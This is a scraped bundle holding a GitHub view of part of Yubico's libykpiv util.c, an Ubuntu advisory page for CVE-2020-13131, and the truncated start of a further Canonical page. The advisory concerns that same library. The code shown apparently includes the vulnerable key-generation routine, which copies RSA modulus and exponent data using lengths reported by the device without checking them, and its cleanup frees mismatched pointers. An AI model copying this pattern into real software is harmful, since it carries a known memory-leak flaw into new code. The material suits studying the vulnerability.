 cbRealloc = (sizeof(ykpiv\_key) + cbBuf - 1) > (cbData - offset) ? MAX((sizeof(ykpiv\_key) + cbBuf - 1) - (cbData - offset), CB\_PAGE) : 0;
 if (0 != cbRealloc) { if (!(pTemp = \_ykpiv\_realloc(state, pData, cbData + cbRealloc))) { /\* realloc failed, pData will be freed in cleanup \*/ res = YKPIV\_MEMORY\_ERROR; goto Cleanup; } pData = pTemp; pTemp = NULL; }
 cbData += cbRealloc;
 // If ykpiv\_key is misaligned or results in padding, this causes problems // in the array we return. If this becomes a problem, we'll probably want // to go with a flat byte array.
 pKey = (ykpiv\_key\*)(pData + offset);
 pKey->slot = SLOTS[i]; pKey->cert\_len = (uint16\_t)cbBuf; memcpy(pKey->cert, buf, cbBuf);
 offset += sizeof(ykpiv\_key) + cbBuf - 1; (\*key\_count)++; } }
 \*data = (ykpiv\_key\*)pData; pData = NULL;
 if (data\_len) { \*data\_len = offset; }
 res = YKPIV\_OK;
Cleanup:
 if (pData) { \_ykpiv\_free(state, pData); }
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_free(ykpiv\_state \*state, void \*data) { if (!data) return YKPIV\_OK; if (!state || (!(state->allocator.pfn\_free))) return YKPIV\_GENERIC\_ERROR;
 \_ykpiv\_free(state, data);
 return YKPIV\_OK;}
ykpiv\_rc ykpiv\_util\_read\_cert(ykpiv\_state \*state, uint8\_t slot, uint8\_t \*\*data, size\_t \*data\_len) { ykpiv\_rc res = YKPIV\_OK; uint8\_t buf[CB\_BUF\_MAX]; size\_t cbBuf = sizeof(buf);
 if ((NULL == data )|| (NULL == data\_len)) return YKPIV\_GENERIC\_ERROR;
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 \*data = 0; \*data\_len = 0;
 if (YKPIV\_OK == (res = \_read\_certificate(state, slot, buf, &cbBuf))) {
 /\* handle those who write empty certificate blobs to PIV objects \*/ if (cbBuf == 0) { \*data = NULL; \*data\_len = 0; goto Cleanup; }
 if (!(\*data = \_ykpiv\_alloc(state, cbBuf))) { res = YKPIV\_MEMORY\_ERROR; goto Cleanup; }
 memcpy(\*data, buf, cbBuf);
 \*data\_len = cbBuf; }
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_write\_cert(ykpiv\_state \*state, uint8\_t slot, uint8\_t \*data, size\_t data\_len, uint8\_t certinfo) { ykpiv\_rc res = YKPIV\_OK;
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 res = \_write\_certificate(state, slot, data, data\_len, certinfo);
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_delete\_cert(ykpiv\_state \*state, uint8\_t slot) { return ykpiv\_util\_write\_cert(state, slot, NULL, 0, 0);}
ykpiv\_rc ykpiv\_util\_block\_puk(ykpiv\_state \*state) { ykpiv\_rc res = YKPIV\_OK; uint8\_t puk[] = { 0x30, 0x42, 0x41, 0x44, 0x46, 0x30, 0x30, 0x44 }; int tries = -1; uint8\_t data[CB\_BUF\_MAX]; size\_t cb\_data = sizeof(data); uint8\_t \*p\_item = NULL; size\_t cb\_item = 0; uint8\_t flags = 0;
 if (NULL == state) return YKPIV\_GENERIC\_ERROR;
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 while (tries != 0) { if (YKPIV\_OK == (res = ykpiv\_change\_puk(state, (const char\*)puk, sizeof(puk), (const char\*)puk, sizeof(puk), &tries))) { /\* did we accidentally choose the correct PUK?, change our puk and try again \*/ puk[0]++; } else { /\* depending on the firmware, tries may not be set to zero when the PUK is blocked, \*/ /\* instead, the return code will be PIN\_LOCKED and tries will be unset \*/ if (YKPIV\_PIN\_LOCKED == res) { tries = 0; res = YKPIV\_OK; } } }
 /\* attempt to set the puk blocked flag in admin data \*/
 if (YKPIV\_OK == \_read\_metadata(state, TAG\_ADMIN, data, &cb\_data)) { if (YKPIV\_OK == \_get\_metadata\_item(data, cb\_data, TAG\_ADMIN\_FLAGS\_1, &p\_item, &cb\_item)) { if (sizeof(flags) == cb\_item) { memcpy(&flags, p\_item, cb\_item); } else { if (state->verbose) { fprintf(stderr, "admin flags exist, but are incorrect size = %lu", (unsigned long)cb\_item); } } } }
 flags |= ADMIN\_FLAGS\_1\_PUK\_BLOCKED;
 if (YKPIV\_OK != \_set\_metadata\_item(data, &cb\_data, CB\_OBJ\_MAX, TAG\_ADMIN\_FLAGS\_1, (uint8\_t\*)&flags, sizeof(flags))) { if (state->verbose) { fprintf(stderr, "could not set admin flags"); } } else { if (YKPIV\_OK != \_write\_metadata(state, TAG\_ADMIN, data, cb\_data)) { if (state->verbose) { fprintf(stderr, "could not write admin metadata"); } } }
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_read\_mscmap(ykpiv\_state \*state, ykpiv\_container \*\*containers, size\_t \*n\_containers) { ykpiv\_rc res = YKPIV\_OK; uint8\_t buf[CB\_BUF\_MAX]; unsigned long cbBuf = sizeof(buf); size\_t len = 0; uint8\_t \*ptr = NULL;
 if ((NULL == containers) || (NULL == n\_containers)) { res = YKPIV\_GENERIC\_ERROR; goto Cleanup; } if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 \*containers = 0; \*n\_containers = 0;
 if (YKPIV\_OK == (res = \_ykpiv\_fetch\_object(state, YKPIV\_OBJ\_MSCMAP, buf, &cbBuf))) { ptr = buf;
 /\* check that object contents are at least large enough to read the header \*/ if (cbBuf < CB\_OBJ\_TAG\_MIN) { res = YKPIV\_OK; goto Cleanup; }
 if (\*ptr++ == TAG\_MSCMAP) { ptr += (unsigned long)\_ykpiv\_get\_length(ptr, &len);
 /\* check that decoded length represents object contents \*/ if (len > (cbBuf - (size\_t)(ptr - buf))) { res = YKPIV\_OK; goto Cleanup; }
 if (NULL == (\*containers = \_ykpiv\_alloc(state, len))) { res = YKPIV\_MEMORY\_ERROR; goto Cleanup; }
 /\* should check if container map isn't corrupt \*/
 memcpy(\*containers, ptr, len); \*n\_containers = len / sizeof(ykpiv\_container); } }
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_write\_mscmap(ykpiv\_state \*state, ykpiv\_container \*containers, size\_t n\_containers) { ykpiv\_rc res = YKPIV\_OK; uint8\_t buf[CB\_OBJ\_MAX]; size\_t offset = 0; size\_t req\_len = 0; size\_t data\_len = n\_containers \* sizeof(ykpiv\_container);
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 // check if data and data\_len are zero, this means that // we intend to delete the object if ((NULL == containers) || (0 == n\_containers)) {
 // if either containers or n\_containers are non-zero, return an error, // that we only delete strictly when both are set properly if ((NULL != containers) || (0 != n\_containers)) { res = YKPIV\_GENERIC\_ERROR; } else { res = \_ykpiv\_save\_object(state, YKPIV\_OBJ\_MSCMAP, NULL, 0); }
 goto Cleanup; }
 // encode object data for storage
 // calculate the required length of the encoded object req\_len = 1 /\* data tag \*/ + (unsigned long)\_ykpiv\_set\_length(buf, data\_len) + data\_len;
 if (req\_len > \_obj\_size\_max(state)) { res = YKPIV\_SIZE\_ERROR; goto Cleanup; }
 buf[offset++] = TAG\_MSCMAP; offset += \_ykpiv\_set\_length(buf + offset, data\_len); memcpy(buf + offset, (uint8\_t\*)containers, data\_len); offset += data\_len;
 // write onto device res = \_ykpiv\_save\_object(state, YKPIV\_OBJ\_MSCMAP, buf, offset);
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_read\_msroots(ykpiv\_state \*state, uint8\_t \*\*data, size\_t \*data\_len) { ykpiv\_rc res = YKPIV\_OK; uint8\_t buf[CB\_BUF\_MAX]; unsigned long cbBuf = sizeof(buf); size\_t len = 0; uint8\_t \*ptr = NULL; int object\_id = 0; uint8\_t tag = 0; uint8\_t \*pData = NULL; uint8\_t \*pTemp = NULL; size\_t cbData = 0; size\_t cbRealloc = 0; size\_t offset = 0;
 if (!data || !data\_len) return YKPIV\_GENERIC\_ERROR;
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 \*data = 0; \*data\_len = 0;
 // allocate first page cbData = \_obj\_size\_max(state); if (NULL == (pData = \_ykpiv\_alloc(state, cbData))) { res = YKPIV\_MEMORY\_ERROR; goto Cleanup; }
 for (object\_id = YKPIV\_OBJ\_MSROOTS1; object\_id <= YKPIV\_OBJ\_MSROOTS5; object\_id++) { cbBuf = sizeof(buf);
 if (YKPIV\_OK != (res = \_ykpiv\_fetch\_object(state, object\_id, buf, &cbBuf))) { goto Cleanup; }
 ptr = buf;
 if (cbBuf < CB\_OBJ\_TAG\_MIN) { res = YKPIV\_OK; goto Cleanup; }
 tag = \*ptr++;
 if (((TAG\_MSROOTS\_MID != tag) && (TAG\_MSROOTS\_END != tag)) || ((YKPIV\_OBJ\_MSROOTS5 == object\_id) && (TAG\_MSROOTS\_END != tag))) { // the current object doesn't contain a valid part of a msroots file res = YKPIV\_OK; // treat condition as object isn't found goto Cleanup; }
 ptr += \_ykpiv\_get\_length(ptr, &len);
 // check that decoded length represents object contents if (len > (cbBuf - (size\_t)(ptr - buf))) { res = YKPIV\_OK; goto Cleanup; }
 cbRealloc = len > (cbData - offset) ? len - (cbData - offset) : 0;
 if (0 != cbRealloc) { if (!(pTemp = \_ykpiv\_realloc(state, pData, cbData + cbRealloc))) { /\* realloc failed, pData will be freed in cleanup \*/ res = YKPIV\_MEMORY\_ERROR; goto Cleanup; } pData = pTemp; pTemp = NULL; }
 cbData += cbRealloc;
 memcpy(pData + offset, ptr, len); offset += len;
 if (TAG\_MSROOTS\_END == tag) { break; } }
 // return data \*data = pData; pData = NULL; \*data\_len = offset;
 res = YKPIV\_OK;
Cleanup:
 if (pData) { \_ykpiv\_free(state, pData); }
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_write\_msroots(ykpiv\_state \*state, uint8\_t \*data, size\_t data\_len) { ykpiv\_rc res = YKPIV\_OK; uint8\_t buf[CB\_OBJ\_MAX]; size\_t offset = 0; size\_t data\_offset = 0; size\_t data\_chunk = 0; size\_t n\_objs = 0; unsigned int i = 0; size\_t cb\_obj\_max = \_obj\_size\_max(state);
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 // check if either data and data\_len are zero, this means that // we intend to delete the object if ((NULL == data) || (0 == data\_len)) {
 // if either data or data\_len are non-zero, return an error, // that we only delete strictly when both are set properly if ((NULL != data) || (0 != data\_len)) { res = YKPIV\_GENERIC\_ERROR; } else { // it should be sufficient to just delete the first object, though // to be complete we should erase all of the MSROOTS objects res = \_ykpiv\_save\_object(state, YKPIV\_OBJ\_MSROOTS1, NULL, 0); }
 goto Cleanup; }
 // calculate number of objects required to store blob n\_objs = (data\_len / (cb\_obj\_max - CB\_OBJ\_TAG\_MAX)) + 1;
 // we're allowing 5 objects to be used to span the msroots file if (n\_objs > 5) { res = YKPIV\_SIZE\_ERROR; goto Cleanup; }
 for (i = 0; i < n\_objs; i++) { offset = 0; data\_chunk = MIN(cb\_obj\_max - CB\_OBJ\_TAG\_MAX, data\_len - data\_offset);
 /\* encode object data for storage \*/ buf[offset++] = (i == (n\_objs - 1)) ? TAG\_MSROOTS\_END : TAG\_MSROOTS\_MID; offset += \_ykpiv\_set\_length(buf + offset, data\_chunk); memcpy(buf + offset, data + data\_offset, data\_chunk); offset += data\_chunk;
 /\* write onto device \*/ res = \_ykpiv\_save\_object(state, (int)(YKPIV\_OBJ\_MSROOTS1 + i), buf, offset);
 if (YKPIV\_OK != res) { goto Cleanup; }
 data\_offset += data\_chunk; }
Cleanup:
 \_ykpiv\_end\_transaction(state); return res;}
ykpiv\_rc ykpiv\_util\_generate\_key(ykpiv\_state \*state, uint8\_t slot, uint8\_t algorithm, uint8\_t pin\_policy, uint8\_t touch\_policy, uint8\_t \*\*modulus, size\_t \*modulus\_len, uint8\_t \*\*exp, size\_t \*exp\_len, uint8\_t \*\*point, size\_t \*point\_len) { ykpiv\_rc res = YKPIV\_OK; unsigned char in\_data[11]; unsigned char \*in\_ptr = in\_data; unsigned char data[1024]; unsigned char templ[] = { 0, YKPIV\_INS\_GENERATE\_ASYMMETRIC, 0, 0 }; unsigned long recv\_len = sizeof(data); int sw; uint8\_t \*ptr\_modulus = NULL; size\_t cb\_modulus = 0; uint8\_t \*ptr\_exp = NULL; size\_t cb\_exp = 0; uint8\_t \*ptr\_point = NULL; size\_t cb\_point = 0;
 setting\_bool\_t setting\_roca = { 0 }; const char sz\_setting\_roca[] = "Enable\_Unsafe\_Keygen\_ROCA"; const char sz\_roca\_format[] = "YubiKey serial number %u is affected by vulnerability " "CVE-2017-15361 (ROCA) and should be replaced. On-chip key generation %s " "See YSA-2017-01 <https://www.yubico.com/support/security-advisories/ysa-2017-01/> " "for additional information on device replacement and mitigation assistance.\n"; const char sz\_roca\_allow\_user[] = "was permitted by an end-user configuration setting, but is not recommended."; const char sz\_roca\_allow\_admin[] = "was permitted by an administrator configuration setting, but is not recommended."; const char sz\_roca\_block\_user[] = "was blocked due to an end-user configuration setting."; const char sz\_roca\_block\_admin[] = "was blocked due to an administrator configuration setting."; const char sz\_roca\_default[] = "was permitted by default, but is not recommended. " "The default behavior will change in a future Yubico release.";
 if (!state) return YKPIV\_ARGUMENT\_ERROR;
 if (ykpiv\_util\_devicemodel(state) == DEVTYPE\_YK4 && (algorithm == YKPIV\_ALGO\_RSA1024 || algorithm == YKPIV\_ALGO\_RSA2048)) { if ((state->ver.major == 4) && (state->ver.minor < 3 || ((state->ver.minor == 3) && (state->ver.patch < 5)))) { const char \*psz\_msg = NULL; setting\_roca = setting\_get\_bool(sz\_setting\_roca, true);
 switch (setting\_roca.source) { case SETTING\_SOURCE\_ADMIN: psz\_msg = setting\_roca.value ? sz\_roca\_allow\_admin : sz\_roca\_block\_admin; break;
 case SETTING\_SOURCE\_USER: psz\_msg = setting\_roca.value ? sz\_roca\_allow\_user : sz\_roca\_block\_user; break;
 default: case SETTING\_SOURCE\_DEFAULT: psz\_msg = sz\_roca\_default; break; }
 fprintf(stderr, sz\_roca\_format, state->serial, psz\_msg); yc\_log\_event(1, setting\_roca.value ? YC\_LOG\_LEVEL\_WARN : YC\_LOG\_LEVEL\_ERROR, sz\_roca\_format, state->serial, psz\_msg);
 if (!setting\_roca.value) { return YKPIV\_NOT\_SUPPORTED; } } }
 switch (algorithm) { case YKPIV\_ALGO\_RSA1024: case YKPIV\_ALGO\_RSA2048: if (!modulus || !modulus\_len || !exp || !exp\_len) { if (state->verbose) { fprintf(stderr, "Invalid output parameter for RSA algorithm"); } return YKPIV\_GENERIC\_ERROR; } \*modulus = NULL; \*modulus\_len = 0; \*exp = NULL; \*exp\_len = 0; break;
 case YKPIV\_ALGO\_ECCP256: case YKPIV\_ALGO\_ECCP384: if (!point || !point\_len) { if (state->verbose) { fprintf(stderr, "Invalid output parameter for ECC algorithm"); } return YKPIV\_GENERIC\_ERROR; } \*point = NULL; \*point\_len = 0; break;
 default: if (state->verbose) { fprintf(stderr, "Invalid algorithm specified"); } return YKPIV\_GENERIC\_ERROR; }
 if (YKPIV\_OK != (res = \_ykpiv\_begin\_transaction(state))) return res; if (YKPIV\_OK != (res = \_ykpiv\_ensure\_application\_selected(state))) goto Cleanup;
 templ[3] = slot;
 \*in\_ptr++ = 0xac; \*in\_ptr++ = 3; \*in\_ptr++ = YKPIV\_ALGO\_TAG; \*in\_ptr++ = 1; \*in\_ptr++ = algorithm;
 if (in\_data[4] == 0) { res = YKPIV\_ALGORITHM\_ERROR; if (state->verbose) { fprintf(stderr, "Unexpected algorithm.\n"); } goto Cleanup; }
 if (pin\_policy != YKPIV\_PINPOLICY\_DEFAULT) { in\_data[1] += 3; \*in\_ptr++ = YKPIV\_PINPOLICY\_TAG; \*in\_ptr++ = 1; \*in\_ptr++ = pin\_policy; }
 if (touch\_policy != YKPIV\_TOUCHPOLICY\_DEFAULT) { in\_data[1] += 3; \*in\_ptr++ = YKPIV\_TOUCHPOLICY\_TAG; \*in\_ptr++ = 1; \*in\_ptr++ = touch\_policy; }
 if (YKPIV\_OK != (res = \_ykpiv\_transfer\_data(state, templ, in\_data, (long)(in\_ptr - in\_data), data, &recv\_len, &sw))) { if (state->verbose) { fprintf(stderr, "Failed to communicate.\n"); } goto Cleanup; } else if (sw != SW\_SUCCESS) { if (state->verbose) { fprintf(stderr, "Failed to generate new key ("); }
 if (sw == SW\_ERR\_INCORRECT\_SLOT) { res = YKPIV\_KEY\_ERROR; if (state->verbose) { fprintf(stderr, "incorrect slot)\n"); } } else if (sw == SW\_ERR\_INCORRECT\_PARAM) { res = YKPIV\_ALGORITHM\_ERROR;
 if (state->verbose) { if (pin\_policy != YKPIV\_PINPOLICY\_DEFAULT) { fprintf(stderr, "pin policy not supported?)\n"); } else if (touch\_policy != YKPIV\_TOUCHPOLICY\_DEFAULT) { fprintf(stderr, "touch policy not supported?)\n"); } else { fprintf(stderr, "algorithm not supported?)\n"); } } } else if (sw == SW\_ERR\_SECURITY\_STATUS) { res = YKPIV\_AUTHENTICATION\_ERROR; if (state->verbose) { fprintf(stderr, "not authenticated)\n"); } } else { res = YKPIV\_GENERIC\_ERROR; if (state->verbose) { fprintf(stderr, "error %x)\n", sw); } }
 goto Cleanup; }
 if ((YKPIV\_ALGO\_RSA1024 == algorithm) || (YKPIV\_ALGO\_RSA2048 == algorithm)) { unsigned char \*data\_ptr = data + 5; size\_t len = 0;
 if (\*data\_ptr != TAG\_RSA\_MODULUS) { if (state->verbose) { fprintf(stderr, "Failed to parse public key structure (modulus).\n"); } res = YKPIV\_PARSE\_ERROR; goto Cleanup; }
 data\_ptr++; data\_ptr += \_ykpiv\_get\_length(data\_ptr, &len);
 cb\_modulus = len; if (NULL == (ptr\_modulus = \_ykpiv\_alloc(state, cb\_modulus))) { if (state->verbose) { fprintf(stderr, "Failed to allocate memory for modulus.\n"); } res = YKPIV\_MEMORY\_ERROR; goto Cleanup; }
 memcpy(ptr\_modulus, data\_ptr, cb\_modulus);
 data\_ptr += len;
 if (\*data\_ptr != TAG\_RSA\_EXP) { if (state->verbose) { fprintf(stderr, "Failed to parse public key structure (public exponent).\n"); } res = YKPIV\_PARSE\_ERROR; goto Cleanup; }
 data\_ptr++; data\_ptr += \_ykpiv\_get\_length(data\_ptr, &len);
 cb\_exp = len; if (NULL == (ptr\_exp = \_ykpiv\_alloc(state, cb\_exp))) { if (state->verbose) { fprintf(stderr, "Failed to allocate memory for public exponent.\n"); } res = YKPIV\_MEMORY\_ERROR; goto Cleanup; }
 memcpy(ptr\_exp, data\_ptr, cb\_exp);
 // set output parameters
 \*modulus = ptr\_modulus; ptr\_modulus = NULL; \*modulus\_len = cb\_modulus; \*exp = ptr\_exp; ptr\_exp = NULL; \*exp\_len = cb\_exp; } else if ((YKPIV\_ALGO\_ECCP256 == algorithm) || (YKPIV\_ALGO\_ECCP384 == algorithm)) { unsigned char \*data\_ptr = data + 3; size\_t len;
 if (YKPIV\_ALGO\_ECCP256 == algorithm) { len = CB\_ECC\_POINTP256; } else { len = CB\_ECC\_POINTP384; }
 if (\*data\_ptr++ != TAG\_ECC\_POINT) { if (state->verbose) { fprintf(stderr, "Failed to parse public key structure.\n"); } res = YKPIV\_PARSE\_ERROR; goto Cleanup; }
 if (\*data\_ptr++ != len) { /\* the curve point should always be determined by the curve \*/ if (state->verbose) { fprintf(stderr, "Unexpected length.\n"); } res = YKPIV\_ALGORITHM\_ERROR; goto Cleanup; }
 cb\_point = len; if (NULL == (ptr\_point = \_ykpiv\_alloc(state, cb\_point))) { if (state->verbose) { fprintf(stderr, "Failed to allocate memory for public point.\n"); } res = YKPIV\_MEMORY\_ERROR; goto Cleanup; }
 memcpy(ptr\_point, data\_ptr, cb\_point);
 // set output parameters
 \*point = ptr\_point; ptr\_point = NULL; \*point\_len = cb\_point; } else { if (state->verbose) { fprintf(stderr, "Wrong algorithm.\n"); } res = YKPIV\_ALGORITHM\_ERROR; goto Cleanup; }
Cleanup:
 if (ptr\_modulus) { \_ykpiv\_free(state, modulus); } if (ptr\_exp) { \_ykpiv\_free(state, ptr\_exp); } if (ptr\_point) { \_ykpiv\_free(state, ptr\_exp); }
 \_ykpiv\_end\_transaction(state); return res;}
[View remainder of file in raw view](https://github.com/Yubico/yubico-piv-tool/raw/d5a78951119c94bf232472900be74fdc651eb36e/lib/util.c)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from people.canonical.com_6e4a192b_20250119_135229.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# CVE-2020-13131

Publication date 9 July 2020

Last updated 24 July 2024

---

Ubuntu priority

![](https://assets.ubuntu.com/v1/8010f9e0-CVE-Priority-icon-Medium.svg)

**Medium**

[Why this priority?](/security/cves/about#priority )

## Cvss 3 Severity Score

![](https://assets.ubuntu.com/v1/8010f9e0-CVE-Priority-icon-Medium.svg)

**4.3 · Medium**

[Score breakdown](#impact-score)

Toggle side navigation

Toggle table of contents

* [Description](#description)
* [Status](#status)
* [Severity score breakdown](#impact-score)
* [References](#references)

An issue was discovered in Yubico libykpiv before 2.1.0. lib/util.c in this
library (which is included in yubico-piv-tool) does not properly check
embedded length fields during device communication. A malicious PIV token
can misreport the returned length fields during RSA key generation. This
will cause stack memory to be copied into heap allocated memory that gets
returned to the caller. The leaked memory could include PINs, passwords,
key material, and other sensitive information depending on the integration.
During further processing by the caller, this information could leak across
trust boundaries. Note that RSA key generation is triggered by the host and
cannot directly be triggered by the token.

## Status

Show unmaintained releases

| Package | Ubuntu Release | Status |
| --- | --- | --- |
| yubico-piv-tool | 24.10 oracular | Not affected |
| 24.04 LTS noble | Not affected |
| 23.10 mantic | Not affected |
| 23.04 lunar | Not affected |
| 22.10 kinetic | Not affected |
| 22.04 LTS jammy | Not affected |
| 21.10 impish | Not affected |
| 21.04 hirsute | Not affected |
| 20.10 groovy | Ignored end of life |
| 20.04 LTS focal | Needs evaluation |
| 19.10 eoan | Ignored end of life |
| 18.04 LTS bionic | Needs evaluation |
| 16.04 LTS xenial | Needs evaluation |
| 14.04 LTS trusty | Not in release |

---

* [How can I get the fixes?](/security/cves/about#security)
* [What do statuses mean?](/security/cves/about#statuses)

## Severity score breakdown

| Parameter | Value |
| --- | --- |
| Base score | 4.3 · Medium |
| Attack vector | Physical |
| Attack complexity | Low |
| Privileges required | None |
| User interaction | Required |
| Scope | Unchanged |
| Confidentiality | High |
| Integrity impact | None |
| Availability impact | None |
| Vector | CVSS:3.1/AV:P/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N |

## References

* [MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13131)
* [NVD](https://nvd.nist.gov/vuln/detail/CVE-2020-13131)
* [Launchpad](https://launchpad.net/bugs/cve/CVE-2020-13131)
* [Debian](https://security-tracker.debian.org/tracker/CVE-2020-13131)

### Other references

* <https://blog.inhq.net/posts/yubico-libykpiv-vuln/>
* <https://www.yubico.com/products/services-software/download/smart-card-drivers-tools/>
* <https://www.cve.org/CVERecord?id=CVE-2020-13131>

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
* [Managed](/observability/managed)

---

## [Pricing](/pricing) [Pricing](/pricing)

* [Consulting](/pricing/consulting)
* [Desktops](/pricing/desktop)
* [Devices](/pricing/devices)

---

## Solutions

* [AI](https://canonical.com/solutions/ai)
* [Data](https://canonical.com/data)
* [Infrastructure](https://canonical.com/solutions/infrastructure)
* [Secure open source](https://canonical.com/solutions/secure-open-source)

---

## Sectors

* [Automotive](/automotive)
* [Industrial](/industrial)
* [Government](/gov)
* [Telco](/telco)
* [Finance](/financial-services)

---

[Contact us](/contact-us)

* [About us](/about)
* [Community](/community)
* [Careers](https://www.canonical.com/careers)
* [Blog](/blog)
* [Resources](/engage)
* [Press centre](/blog/press-centre)

---

© 2025 Canonical Ltd.

Ubuntu and Canonical are registered trademarks of Canonical Ltd.

---

* [Legal information](/legal)
* [Data privacy](/legal/data-privacy)
* Manage your tracker settings
* [Report a bug on this site](https://github.com/canonical/ubuntu.com/issues/new?template=ISSUE_TEMPLATE.yaml)

Back to top

Go to the top of the page



=== Content from people.canonical.com_a908efc5_20250119_135223.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

